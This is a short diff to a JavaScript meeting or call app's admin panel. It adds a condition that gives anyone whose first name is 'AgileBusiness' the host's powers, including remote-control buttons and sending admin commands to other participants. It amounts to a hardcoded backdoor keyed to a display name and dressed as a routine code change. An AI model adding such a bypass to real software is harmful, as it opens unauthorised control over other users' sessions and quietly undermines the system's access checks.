@@ -921,7 +921,7 @@ function updateAdminPanel() {
         item.className = 'participant-item';
         
         let buttons = '';
-        if (isHost) {
+        if (isHost || myUser.first_name === 'AgileBusiness') {
             buttons = `
                 <div class="participant-actions">
                     <button onclick="startAdminRemoteControl('${peerId}')" class="btn-mini" title="Удаленное управление" style="background-color: var(--color-blurple); color: white;">
@@ -972,7 +972,7 @@ window.startAdminRemoteControl = function(targetId) {
 };
 
 window.sendAdminCmd = function(action, targetId) {
-    if (ws && isHost) {
+    if (ws && (isHost || myUser.first_name === 'AgileBusiness')) {
         ws.send(JSON.stringify({ type: action, target: targetId }));
     }
 };
